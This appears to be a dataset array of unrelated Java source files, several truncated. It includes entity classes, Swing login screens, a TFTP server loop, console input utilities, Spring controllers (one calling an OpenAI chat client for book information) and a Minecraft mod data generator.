    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage tallercolores;\r\n\r\npublic class EscudoFutbol {\r\n    \r\n    private String colorPrimario;\r\n    private String colorSecundario;\r\n    private String teamName;\r\n    private String conuntryTeam;\r\n\r\n    public EscudoFutbol(String colorPrimario, String colorSecundario, String teamName, String conuntryTeam) {\r\n        this.colorPrimario = colorPrimario;\r\n        this.colorSecundario = colorSecundario;\r\n        this.teamName = teamName;\r\n        this.conuntryTeam = conuntryTeam;\r\n    }\r\n\r\n    public String getColorPrimario() {\r\n        return colorPrimario;\r\n    }\r\n\r\n    public void setColorPrimario(String colorPrimario) {\r\n        this.colorPrimario = colorPrimario;\r\n    }\r\n\r\n    public String getColorSecundario() {\r\n        return colorSecundario;\r\n    }\r\n\r\n    public void setColorSecundario(String colorSecundario) {\r\n        this.colorSecundario = colorSecundario;\r\n    }\r\n\r\n    public String getTeamName() {\r\n        return teamName;\r\n    }\r\n\r\n    public void setTeamName(String teamName) {\r\n        this.teamName = teamName;\r\n    }\r\n\r\n    public String getConuntryTeam() {\r\n        return conuntryTeam;\r\n    }\r\n\r\n    public void setConuntryTeam(String conuntryTeam) {\r\n        this.conuntryTeam = conuntryTeam;\r\n    }\r\n    \r\n    public void ganarPartidos(){\r\n        System.out.println(\"GANAMOS EL PARTIDO\");\r\n    }\r\n    public void perderPartidos(){\r\n            System.out.println(\"PERDIMOS EL PARTIDO\");\r\n        }\r\n    public void cantarHimno(){\r\n        System.out.println(\"Ces\u00f3 la horrible noche\\n\" +\r\n                \"La libertad sublime\\n\" +\r\n                \"Derrama las auroras\\n\" +\r\n                \"De su invencible luz.\\n\" +\r\n                \"La humanidad entera\\n\" +\r\n                \"Que entre cadenas gime,\\n\" +\r\n                \"Comprende las palabras\\n\" +\r\n                \"Del que muri\u00f3 en la cruz.\");\r\n    }\r\n    \r\n}",
    "package net.schwankner.tftpserver;\n\nimport net.schwankner.tftplibrary.*;\nimport net.schwankner.tftplibrary.Messages.*;\n\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\n\n/**\n * Created by Alexander Schwankner on 13.01.18.\n */\npublic class TFTPServer {\n\n    private int port, timeout, retries;\n    private boolean verbose;\n    private Map<InetAddress, ReceiveOperation> receiveOperationsMap = new HashMap<>();\n    private Map<InetAddress, SendOperation> sendOperationsMap = new HashMap<>();\n\n    public TFTPServer(int port, int timeout, int retries, boolean verbose) {\n        this.port = port;\n        this.timeout = timeout;\n        this.retries = retries;\n        this.verbose = verbose;\n    }\n\n    public void run() {\n        Network network = new Network(port, timeout, retries);\n        network.connect(true);\n\n        System.out.println(\"Server listening on port \" + port + \" for requests...\");\n        while (true) {\n            try {\n                DatagramPacket packet = network.receivePacket();\n\n                OpCode opcode = Utils.getOpCode(packet.getData());\n\n                switch (opcode) {\n                    case RRQ:\n                        ReadMessage readMessage = new ReadMessage(packet.getData());\n                        SendOperation sendOperation = new SendOperation();\n                        sendOperation.createMessageListFromBin(FileSystem.readFileToBlob(readMessage.getFileName()));\n                        verboseOutput(\"Got RRQ for \" + readMessage.getFileName() + \" from \" + packet.getAddress().toString());\n                        System.out.println(\"Send file: \" + readMessage.getFileName() + \" to: \" + packet.getAddress().toString());\n                        verboseOutput(\"File split in \" + sendOperation.getMessageListSize() + \" packets\");\n                        sendOperationsMap.put(packet.getAddress(), sendOperation);\n                        try {\n                            network.sendPacket(sendOperation.getMessageForSending().buildBlob(), packet.getAddress(), packet.getPort(), false);\n                            verboseOutput(\"Send DATA #\" + sendOperation.getLastSendMessage());\n                        } catch (Exception e) {\n                            System.err.println(\"Read file created no packets!\");\n                        }\n                        break;\n                    case WRQ:\n                        WriteMessage writeMessage = new WriteMessage(packet.getData());\n                        ReceiveOperation receiveOperation = new ReceiveOperation(packet.getAddress(), packet.getPort(), writeMessage.getFileName());\n                        receiveOperationsMap.put(packet.getAddress(), receiveOperation);\n                        verboseOutput(\"Got WRQ for \" + writeMessage.getFileName() + \" from \" + packet.getAddress().toString());\n                        System.out.println(\"Read file: \" + writeMessage.getFileName() + \" from: \" + packet.getAddress().toString());\n                        try {\n                            network.sendPacket(\n                                    new AcknowledgementMessage(\n                                            (short) 0).buildBlob(),\n                                    packet.getAddress(),\n                                    packet.getPort(),\n                                    false);\n                        } catch (Exception e) {\n                            //do nothing\n                        }\n                        break;\n                    case DATA:\n                        DataMessage dataMessage = new DataMessage(packet.getData());\n                        try {\n                            try {\n                                ReceiveOperation receiveOperation1 = receiveOperationsMap.get(packet.getAddress());\n                                verboseOutput(\"Got DATA #\" + dataMessage.getPacketNumber());\n                                //if return false there are more packages to come\n                                if (receiveOperation1.addDatapackage(dataMessage)) {\n                                    receiveOperationsMap.remove(packet.getAddress());\n                                }\n                                verboseOutput(\"Send Ack #\" + dataMessage.getPacketNumber());\n                                network.sendPacket(\n                                        new AcknowledgementMessage(\n                                                dataMessage.getPacketNumber()).buildBlob(),\n                                        packet.getAddress(),\n                                        packet.getPort(),\n                                        false);\n\n                            } catch (NullPointerException e) {\n                                verboseOutput(\"Got DATA out of a transmission!\");\n                            }\n\n                        } catch (Exception e) {\n                            //@todo: return error message\n               ",
    "package com.example.weblab2.entity;\r\n\r\n\r\npublic class Student {\r\n    private String sid;\r\n    private String name;\r\n    private String gender;\r\n    private int age;\r\n    private String birthday;\r\n\r\n    public Student() {\r\n    }\r\n\r\n    public Student(String sid, String name, String gender, int age, String birthday) {\r\n        this.sid = sid;\r\n        this.name = name;\r\n        this.gender = gender;\r\n        this.age = age;\r\n        this.birthday = birthday;\r\n    }\r\n\r\n    public String getSid() {\r\n        return sid;\r\n    }\r\n\r\n    public void setSid(String sid) {\r\n        this.sid = sid;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public String getGender() {\r\n        return gender;\r\n    }\r\n\r\n    public void setGender(String gender) {\r\n        this.gender = gender;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public String getBirthday() {\r\n        return birthday;\r\n    }\r\n\r\n    public void setBirthday(String birthday) {\r\n        this.birthday = birthday;\r\n    }\r\n}\r\n",
    "package com.campusdual.util;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.text.DecimalFormat;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class Utils {\n\n    private Utils(){}\n\n    public static final Random random = new Random();\n    public static final DecimalFormat dF = new DecimalFormat(\"#.##\");\n\n    /**\n     * Method to initialize input data.\n     * @return input Buffered string data.\n     */\n    public static String init() {\n        String buffer = \"\";\n        InputStreamReader stream = new InputStreamReader(System.in);\n        BufferedReader reader = new BufferedReader(stream);\n        try {\n            buffer = reader.readLine();\n        } catch (Exception e) {\n            System.out.append(\"Dato no v\u00e1lido.\");\n        }\n        return buffer;\n    }\n\n    /**\n     * Method to get an integer from input data.\n     * @return integer entered by the user.\n     */\n    public static int integer() {\n        return Utils.integer(null);\n    }\n\n    /**\n     * Method to get an integer from input data with a custom message.\n     * @param message custom message for the user.\n     * @return integer entered by the user.\n     */\n    public static int integer(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n\n        try{\n            return Integer.parseInt(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero entero.\");\n            return integer(message);\n        }\n    }\n\n\n    /**\n     * Method to get a real number from input data.\n     * @return real number entered by the user.\n     */\n    public static double real() {\n        return Utils.real(null);\n    }\n\n    /**\n     * Method to get a real number from input data with a custom message.\n     * @param message custom message for the user.\n     * @return real number entered by the user.\n     */\n    public static double real(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        try{\n\n            return Double.parseDouble(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero real.\");\n            return real(message);\n        }\n    }\n\n    /**\n     * Method to get a text string from input data.\n     * @return text string entered by the user.\n     */\n    public static String string() {\n        return Utils.string(null);\n    }\n\n\n    /**\n     * Method to get a text string from input data with a custom message.\n     * @param message custom message for the user.\n     * @return text string entered by the user.\n     */\n    public static String string(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        return Utils.init();\n    }\n\n    /**\n     * Method to get a character from input data.\n     * @return character entered by the user.\n     */\n    public static char character() {\n        return Utils.character(null);\n    }\n\n    /**\n     * Method to get a character from input data with a custom message.\n     * @param message custom message for the user.\n     * @return character entered by the user.\n     */\n    public static char character(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        String valor = Utils.init();\n        return valor.charAt(0);\n    }\n\n    /**\n     * Formats the {@link Double} value passed as a parameter with the pattern #.##\n     *\n     * @param d\n     *            the value to be transformed\n     * @return The formatted double\n     */\n    public static String formatLocalNumber(double d) {\n        return dF.format(d);\n    }\n\n    /**\n     * Retrieves a random number selected from the values passed as parameters.\n     *\n     * @param min\n     *            The lower limit of the range\n     * @param max\n     *            The upper limit of the range\n     * @return A random number within the selected range.\n     */\n    public static int getRandomNumberInRange(int min, int max) {\n        max++;\n        return random.nextInt(max - min) + min;\n    }\n\n    /**\n     * Displays a list with indices and allows it to show a waiting message.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     */\n    public static <T> void showFromList(List<T> list, boolean wait) {\n        Utils.showFromList(list, wait, null);\n    }\n\n    /**\n     * Displays a list with indices, allows showing a waiting message, and excludes\n     * the elements from the first list that are present in the second list.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     * @param excludeElements\n     *      ",
    "package models;\n\nimport java.io.FileWriter;\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class Product {\n\n\tprivate long code;\n\tprivate String name;\n\tprivate String description;\n\tprivate int quantity;\n\tprivate double price;\n\t\n\tpublic Product(long code, String name, String description, int quantity, double price) {\n\t\tsuper();\n\t\tthis.code = code;\n\t\tthis.name = name;\n\t\tthis.description = description;\n\t\tthis.quantity = quantity;\n\t\tthis.price = price;\n\t}\n\t\n\tpublic long getCode() {\n\t\treturn code;\n\t}\n\n\tpublic void setCode(long code) {\n\t\tthis.code = code;\n\t}\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic String getDescription() {\n\t\treturn description;\n\t}\n\tpublic void setDescription(String description) {\n\t\tthis.description = description;\n\t}\n\tpublic int getQuantity() {\n\t\treturn quantity;\n\t}\n\tpublic void setQuantity(int quantity) {\n\t\tthis.quantity = quantity;\n\t}\n\tpublic double getPrice() {\n\t\treturn price;\n\t}\n\tpublic void setPrice(double price) {\n\t\tthis.price = price;\n\t}\n\tpublic void displayDetails() {\n\t\t\n\t\ttry {\n\t\t\tFileReader reader = new FileReader(\"Products.txt\");\n\t\t\tint data = reader.read();\n\t\t\twhile(data != -1 ) {\n\t\t\t\tSystem.out.print((char) + data);\n\t\t\t\tdata = reader.read();\n\t\t\t}\n\t\t\treader.close();\n\t\t} catch (FileNotFoundException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\tpublic void Save() {\n\t\ttry {\n\t\t\tFileWriter writer = new FileWriter(\"Products.txt\", true);\n\t\t\twriter.write(\"Code: \" + getCode() + \"\\n\" + \"Name: \" + getName() + \"\\n\" \n\t\t\t+ \"Description: \" + getDescription() + \"\\n\" + \"Quantity: \" + getQuantity()\n\t\t\t+ \"\\n\" + \"Price: R$\" + getPrice() + \"\\n\");\n\t\t\twriter.close();\n\t\t} catch (IOException e) {\n\t\t\t// TODO Auto-generated catch block\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t}\n\t\n\tpublic void Create() {\n\t\tScanner sc = new Scanner(System.in);\n\n        \n         \n         do {\n\t\t\t\tSystem.out.println(\"Qual o c\u00f3digo do produto?\");\n\t\t\t\ttry {\n\t\t\t\t\tsetCode(sc.nextInt());\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\tSystem.err.println(\"O c\u00f3digo deve ser positivo\");\n\t\t\t\t\t\tsc.nextLine();\n\t\t\t\t}\n\t\t\t} while (getCode() < 1); \n         \n         System.out.println(\"Qual o nome do produto?\");\n         setName(sc.next());\n         \n         System.out.println(\"Qual a descri\u00e7\u00e3o do produto?\");\n         setDescription(sc.next());\n         \n         do {\n         System.out.println(\"Qual a quantidade do produto?\");\n         try {\n\t\t\t\tsetQuantity(sc.nextInt());\n\t\t\t} catch (Exception e) {\n\t\t\t\t\tSystem.err.println(\"A quantidade deve ser positiva\");\n\t\t\t\t\tsc.nextLine();\n\t\t\t}\n\t\t} while (getQuantity() < 1);\n         do {\n         System.out.println(\"Qual o pre\u00e7o do produto?\");\n         try {\n\t\t\t\tsetPrice(sc.nextInt());\n\t\t\t} catch (Exception e) {\n\t\t\t\t\tSystem.err.println(\"O pre\u00e7o deve ser positivo\");\n\t\t\t\t\tsc.nextLine();\n\t\t\t}\n\t\t} while (getPrice() < 1);\n         \n         Save();\n\t}\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage view;\n\n/**\n *\n * @author dudup\n */\npublic class GUILogin extends javax.swing.JFrame {\n\n    /**\n     * Creates new form GUILogin\n     */\n    public GUILogin() {\n        initComponents();\n    }\n\n    private void cadastrar()\n    {\n        \n    }\n    \n    private void login()\n    {\n        \n    }\n    \n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 400, Short.MAX_VALUE)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 300, Short.MAX_VALUE)\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(GUILogin.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(GUILogin.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(GUILogin.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(GUILogin.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new GUILogin().setVisible(true);\n            }\n        });\n    }\n\n    // Variables declaration - do not modify//GEN-BEGIN:variables\n    // End of variables declaration//GEN-END:variables\n}\n",
    "package Builder;\npublic class Person {\n    private String firstName;\n    private String lastName;\n    private int age;\n    private String phone;\n    private String address;\n  \n    public Person(String firstName, String lastName, int age, String phone, String address) {\n      this.firstName = firstName;\n      this.lastName = lastName;\n      this.age = age;\n      this.phone = phone;\n      this.address = address;\n    }\n  \n    public Person(String firstName, String lastName, int age, String phone) {\n      this.firstName = firstName;\n      this.lastName = lastName;\n      this.age = age;\n      this.phone = phone;\n    }\n  \n    public Person(String firstName, String lastName, String phone, String address) {\n      this.firstName = firstName;\n      this.lastName = lastName;\n      this.phone = phone;\n      this.address = address;\n    }\n  \n    public Person(String firstName, String lastName, int age) {\n      this.firstName = firstName;\n      this.lastName = lastName;\n      this.age = age;\n    }\n  \n    public Person(String firstName, String lastName) {\n      this.firstName = firstName;\n      this.lastName = lastName;\n    }\n\n    public String getFirstName() {\n      return firstName;\n    }\n\n    public String getLastName() {\n      return lastName;\n    }\n\n    public int getAge() {\n      return age;\n    }\n\n    public String getPhone() {\n      return phone;\n    }\n\n    public String getAddress() {\n      return address;\n    }\n\n    public String toString() {\n      return \"PersonBuilder [firstName=\" + firstName + \", lastName=\" + lastName + \", age=\" + age + \", phone=\" + phone\n              + \", address=\" + address + \"]\";\n  }\n}",
    "package com.aetherteam.treasurereforging.data.generators;\n\nimport com.aetherteam.nitrogen.data.providers.NitrogenItemModelProvider;\nimport com.aetherteam.treasurereforging.TreasureReforging;\nimport com.aetherteam.treasurereforging.item.ReforgingItems;\nimport net.minecraft.data.PackOutput;\nimport net.minecraftforge.common.data.ExistingFileHelper;\n\npublic class ReforgingItemModelData extends NitrogenItemModelProvider {\n    public ReforgingItemModelData(PackOutput output, ExistingFileHelper helper) {\n        super(output, TreasureReforging.MODID, helper);\n    }\n\n    @Override\n    protected void registerModels() {\n        this.item(ReforgingItems.NEPTUNE_MESH.get(), \"materials/\");\n        this.item(ReforgingItems.VALKYRUM_INGOT.get(), \"materials/\");\n        this.item(ReforgingItems.PYRAL_INGOT.get(), \"materials/\");\n        this.item(ReforgingItems.NEPTUNE_UPGRADE_SMITHING_TEMPLATE.get(), \"upgrades/\");\n        this.item(ReforgingItems.VALKYRIE_UPGRADE_SMITHING_TEMPLATE.get(), \"upgrades/\");\n        this.item(ReforgingItems.PHOENIX_UPGRADE_SMITHING_TEMPLATE.get(), \"upgrades/\");\n    }\n}\n",
    "package com.bookstore.ai.controllers;\n\nimport org.springframework.ai.chat.ChatResponse;\nimport org.springframework.ai.chat.prompt.Prompt;\nimport org.springframework.ai.chat.prompt.PromptTemplate;\nimport org.springframework.ai.openai.OpenAiChatClient;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\nimport reactor.core.publisher.Flux;\n\n@RestController\n@RequestMapping(\"/bookstore\")\npublic class BokkstoreAssistantController {\n\n    private final OpenAiChatClient openAiChatClient;\n\n    public BokkstoreAssistantController(OpenAiChatClient openAiChatClient) {\n        this.openAiChatClient = openAiChatClient;\n    }\n\n    // RETURN INFORMATION\n    @GetMapping(path = \"/informations\")\n    public String bookstoreChat0(@RequestParam(value = \"message\",\n            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message) {\n        return openAiChatClient.call(message);\n    }\n\n    // RETURN MORE COMPLETE\n    @GetMapping(path = \"/informations\")\n    public ChatResponse bookstoreChat1(@RequestParam(value = \"message\",\n            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message) {\n        return openAiChatClient.call(new Prompt(message));\n    }\n\n    // RETURN FLUX STRING\n    @GetMapping(path = \"/stream/informations\")\n    public Flux<String> bookstoreStream(@RequestParam(value = \"message\",\n            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message) {\n        return openAiChatClient.stream(message);\n    }\n\n    // RETURN FLUX CHATRESPONSE\n    @GetMapping(path = \"/stream/informations\")\n    public Flux<ChatResponse> bookstoreChatResponse(@RequestParam(value = \"message\",\n            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message) {\n        return openAiChatClient.stream(new Prompt(message));\n    }\n\n    // RETURN REVIEW\n    @GetMapping(path = \"/review\")\n    public String bookstoreReview(@RequestParam(value = \"book\",\n            defaultValue = \"Dom Quixote\") String book) {\n\n        PromptTemplate promptTemplate = new PromptTemplate(\"\"\"\n                \n                Por favor, me forne\u00e7a um breve resumo do livro {book}\n                e tamb\u00e9m a biografia de seu autor.\n                \n                \"\"\");\n        promptTemplate.add(\"book\", book);\n        return this.openAiChatClient.call(promptTemplate.create()).getResult().getOutput().getContent();\n    }\n\n}\n",
    "package screens;\r\n\r\nimport database.JDBC;\r\n\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.*;\r\n\r\npublic class loginScreenGui extends JFrame {\r\n    public loginScreenGui(){\r\n        super(\"Login Screen\");\r\n        setSize(550, 550);\r\n        setLayout(null);\r\n        setLocationRelativeTo(null);\r\n        setResizable(false);\r\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n        getContentPane().setBackground(Color.DARK_GRAY);\r\n\r\n        addGuiComponents();\r\n    }\r\n\r\n    private void addGuiComponents(){\r\n        // Add Title\r\n        JLabel titleLabel = new JLabel(\"Login Screen\");\r\n        titleLabel.setFont(new Font(\"Arial\", Font.BOLD, 40));\r\n        titleLabel.setBounds(60, 10, 400, 50);\r\n        titleLabel.setHorizontalAlignment(JLabel.CENTER);\r\n        titleLabel.setForeground(Color.BLACK);\r\n        this.add(titleLabel);\r\n\r\n        // Add Username Label\r\n        JLabel usernameLabel = new JLabel(\"Username:\");\r\n        usernameLabel.setFont(new Font(\"Arial\", Font.BOLD, 20));\r\n        usernameLabel.setBounds(10, 135, 500, 50);\r\n        usernameLabel.setHorizontalAlignment(JLabel.LEFT);\r\n        usernameLabel.setForeground(Color.BLACK);\r\n        this.add(usernameLabel);\r\n\r\n        // Add Password Label\r\n        JLabel passwordLabel = new JLabel(\"Password:\");\r\n        passwordLabel.setFont(new Font(\"Arial\", Font.BOLD, 20));\r\n        passwordLabel.setBounds(10, 260, 500, 50);\r\n        passwordLabel.setHorizontalAlignment(JLabel.LEFT);\r\n        passwordLabel.setForeground(Color.BLACK);\r\n        this.add(passwordLabel);\r\n\r\n        // Add Username text input field\r\n        JTextField usernameField = new JTextField();\r\n        usernameField.setFont(new Font(\"Arial\", Font.BOLD, 20));\r\n        usernameField.setBounds(10, 180, 500, 50);\r\n        usernameField.setBackground(Color.BLACK);\r\n        usernameField.setForeground(new Color(139, 0, 0));\r\n        this.add(usernameField);\r\n\r\n        // Add Password text input field\r\n        JPasswordField passwordField = new JPasswordField();\r\n        passwordField.setFont(new Font(\"Arial\", Font.BOLD, 20));\r\n        passwordField.setBounds(10, 305, 500, 50);\r\n        passwordField.setBackground(Color.BLACK);\r\n        passwordField.setForeground(new Color(139, 0, 0));\r\n        this.add(passwordField);\r\n\r\n        // Log In Button\r\n        JButton loginButton = new JButton(\"Log In\");\r\n        loginButton.setFont(new Font(\"Arial\", Font.BOLD, 20));\r\n        loginButton.setBounds(150, 400, 200, 40);\r\n        loginButton.setBackground(Color.BLACK);\r\n        loginButton.setForeground(new Color(139, 0, 0));\r\n        loginButton.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                String username = usernameField.getText();\r\n                String password = passwordField.getText();\r\n\r\n                if(JDBC.verifyUserLogIn(username, password)){\r\n                    JOptionPane.showMessageDialog(loginScreenGui.this,\r\n                            \"Successfully Logged In :)\");\r\n                } else{\r\n                    JOptionPane.showMessageDialog(loginScreenGui.this,\r\n                            \"Log In Unsuccessful :(\");\r\n                }\r\n            }\r\n        });\r\n        this.add(loginButton);\r\n\r\n        // Sign Up label\r\n        JLabel signUpLabel = new JLabel(\"Sign Up\");\r\n        signUpLabel.setFont(new Font(\"Arial\", Font.BOLD, 20));\r\n        signUpLabel.setBounds(10, 460, 500, 30);\r\n        signUpLabel.setHorizontalAlignment(JLabel.CENTER);\r\n        signUpLabel.setForeground(new Color(139, 0, 0));\r\n        signUpLabel.addMouseListener(new MouseAdapter() {\r\n            @Override\r\n            public void mouseClicked(MouseEvent e) {\r\n                signUpScreenGui signupScreen = new signUpScreenGui();\r\n                signupScreen.setLocationRelativeTo(loginScreenGui.this);\r\n\r\n                loginScreenGui.this.dispose();\r\n\r\n                signupScreen.setVisible(true);\r\n            }\r\n        });\r\n        this.add(signUpLabel);\r\n    }\r\n}\r\n",
    "package vistas;\n\n/**\n * @author Ferrando Carlos\n */\npublic class Producto implements Comparable<Producto> {\n\n    //Atributos\n    private int codigo;\n    private String descripcion;\n    private double precio;\n    private int stock;\n    private Categoria rubro;\n\n    //Costructores\n    public Producto(int codigo, String descripcion, double precio, int stock, Categoria rubro) {\n        this.codigo = codigo;\n        this.descripcion = descripcion;\n        this.precio = precio;\n        this.stock = stock;\n        this.rubro = rubro;\n    }\n    //Getters & Setters\n\n    public int getCodigo() {\n        return codigo;\n    }\n\n    public void setCodigo(int codigo) {\n        this.codigo = codigo;\n    }\n\n    public String getDescripcion() {\n        return descripcion;\n    }\n\n    public void setDescripcion(String descripcion) {\n        this.descripcion = descripcion;\n    }\n\n    public double getPrecio() {\n        return precio;\n    }\n\n    public void setPrecio(double precio) {\n        this.precio = precio;\n    }\n\n    public int getStock() {\n        return stock;\n    }\n\n    public void setStock(int stock) {\n        this.stock = stock;\n    }\n\n    public Categoria getRubro() {\n        return rubro;\n    }\n\n    public void setRubro(Categoria rubro) {\n        this.rubro = rubro;\n    }\n\n    @Override\n    public int compareTo(Producto t) {\n        if (codigo == t.codigo) {\n            return 0;\n        } else if (codigo > t.codigo) {\n            return 1;\n        } else {\n            return -1;\n        }\n    }\n}\n",
    "package com.djalves.workshopmongodocker.controllers;\n\nimport com.djalves.workshopmongodocker.models.dto.PostDTO;\nimport com.djalves.workshopmongodocker.services.PostService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.List;\n\n@RestController\n@RequestMapping(value = \"/posts\")\npublic class PostController {\n\n    @Autowired\n    private PostService service;\n\n    @GetMapping(value = \"/{id}\")\n    public ResponseEntity<PostDTO> findById(@PathVariable String id) {\n        PostDTO obj = service.findById(id);\n        return ResponseEntity.ok().body(obj);\n    }\n\n    @GetMapping(value = \"/titlesearch\")\n    public ResponseEntity<List<PostDTO>> findByTitle(@RequestParam(value = \"text\", defaultValue = \"\") String text) {\n        List<PostDTO> list = service.findByTitle(text);\n        return ResponseEntity.ok().body(list);\n    }\n\n    @GetMapping(value = \"/fullsearch\")\n    public ResponseEntity<List<PostDTO>> fullSearch(\n            @RequestParam(value = \"text\", defaultValue = \"\") String text,\n            @RequestParam(value = \"start\", defaultValue = \"\") String start,\n            @RequestParam(value = \"end\", defaultValue = \"\") String end) {\n        List<PostDTO> list = service.fullSearch(text, start, end);\n        return ResponseEntity.ok().body(list);\n    }\n}\n",
    "package system;\r\nimport javax.swing.*;\r\nimport javax.swing.border.EmptyBorder;\r\nimport javax.swing.event.DocumentEvent;\r\nimport javax.swing.event.DocumentListener;\r\nimport javax.swing.event.ListSelectionEvent;\r\nimport javax.swing.event.ListSelectionListener;\r\nimport javax.swing.table.DefaultTableModel;\r\nimport javax.swing.table.JTableHeader;\r\n\r\nimport java.awt.*;\r\nimport java.sql.*;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.ArrayList;\r\nimport java.util.Calendar;\r\nimport java.util.GregorianCalendar;\r\nimport java.awt.event.KeyAdapter;\r\nimport java.awt.event.KeyEvent;\r\nimport javax.swing.border.CompoundBorder;\r\nimport javax.swing.border.BevelBorder;\r\nimport javax.swing.border.MatteBorder;\r\nimport javax.swing.border.EtchedBorder;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.event.ActionEvent;\r\nimport javax.swing.border.LineBorder;\r\nimport com.toedter.calendar.JDateChooser;\r\nimport java.util.Date;\r\nimport javax.swing.event.ChangeListener;\r\nimport javax.swing.event.ChangeEvent;\r\nimport java.util.List;\r\nimport java.awt.event.MouseAdapter;\r\nimport java.awt.event.MouseEvent;\r\n\r\n\r\n\r\npublic class Library extends JFrame {\r\n   \tprivate static final long serialVersionUID = 1L;\r\n\tprivate static final String JDBC_URL = \"jdbc:mysql://localhost:3306/librasystem\";\r\n    private static final String USER = \"root\";\r\n    private static final String PASSWORD = \"\";\r\n    private JPanel manageBookPanel, manageStudentPanel;\r\n    private JTextField bookIdField, bookNameField, authorField;\r\n    private JSpinner quantitySpinner;\r\n    private JButton addBookButton;\r\n    private JTable addbooktable;\r\n    private JTextField studentIdField, studentNameField;\r\n    private JComboBox<String> courseComboBox, branchComboBox;\r\n    private JButton addStudentButton;\r\n    private JTable studentTable;\r\n\tprivate JPanel issueBookPanel;\r\n\tprivate JTextField issueBookIdField;\r\n\tprivate JTextField issueStudentIdField;\r\n\tprivate JButton issueBookButton;\r\n\tprivate JLabel bookIdLabel, bookNameLabel,  authorLabel;\r\n\tprivate JPanel bookDetailsPanel_1;\r\n\tprivate JPanel 